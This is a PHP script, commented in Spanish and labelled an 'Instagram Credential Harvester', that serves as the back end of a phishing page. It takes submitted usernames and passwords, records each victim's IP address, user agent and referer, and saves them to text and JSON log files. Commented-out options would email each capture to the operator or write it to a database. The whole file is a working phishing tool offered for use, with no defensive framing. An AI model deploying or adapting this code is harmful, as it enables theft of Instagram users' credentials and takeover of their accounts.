<?php
// ingenieriasocial - Instagram Credential Harvester
// Creado por: MidasOrion

// Configuración
$log_file = 'captured_credentials.txt';
$redirect_url = 'https://www.instagram.com'; // URL de redirección después de capturar

// Obtener datos del formulario
$username = isset($_POST['username']) ? $_POST['username'] : '';
$password = isset($_POST['password']) ? $_POST['password'] : '';

// Obtener información adicional
$ip = $_SERVER['REMOTE_ADDR'];
$user_agent = $_SERVER['HTTP_USER_AGENT'];
$timestamp = date('Y-m-d H:i:s');
$referer = isset($_SERVER['HTTP_REFERER']) ? $_SERVER['HTTP_REFERER'] : 'Direct';

// Formatear los datos capturados
$log_entry = "═══════════════════════════════════════════════════════════\n";
$log_entry .= "INSTAGRAM - Credenciales Capturadas\n";
$log_entry .= "═══════════════════════════════════════════════════════════\n";
$log_entry .= "Fecha/Hora: $timestamp\n";
$log_entry .= "Usuario: $username\n";
$log_entry .= "Contraseña: $password\n";
$log_entry .= "IP: $ip\n";
$log_entry .= "User-Agent: $user_agent\n";
$log_entry .= "Referer: $referer\n";
$log_entry .= "═══════════════════════════════════════════════════════════\n\n";

// Guardar en archivo
file_put_contents($log_file, $log_entry, FILE_APPEND | LOCK_EX);

// También guardar en formato JSON para fácil procesamiento
$json_file = 'captured_credentials.json';
$json_data = array(
    'platform' => 'Instagram',
    'timestamp' => $timestamp,
    'username' => $username,
    'password' => $password,
    'ip' => $ip,
    'user_agent' => $user_agent,
    'referer' => $referer
);

// Leer JSON existente o crear array vacío
$existing_data = array();
if (file_exists($json_file)) {
    $existing_data = json_decode(file_get_contents($json_file), true);
    if (!is_array($existing_data)) {
        $existing_data = array();
    }
}

// Agregar nuevo dato
$existing_data[] = $json_data;

// Guardar JSON
file_put_contents($json_file, json_encode($existing_data, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE));

// Enviar respuesta
header('Content-Type: application/json');
echo json_encode(array('status' => 'success'));

// Opcional: Enviar notificación por email o webhook
// mail('tu@email.com', 'Nueva captura - Instagram', $log_entry);

// Opcional: Guardar en base de datos
// $conn = new mysqli('localhost', 'user', 'pass', 'database');
// $stmt = $conn->prepare("INSERT INTO captures (platform, username, password, ip, timestamp) VALUES (?, ?, ?, ?, ?)");
// $stmt->bind_param("sssss", 'Instagram', $username, $password, $ip, $timestamp);
// $stmt->execute();

exit();
?>
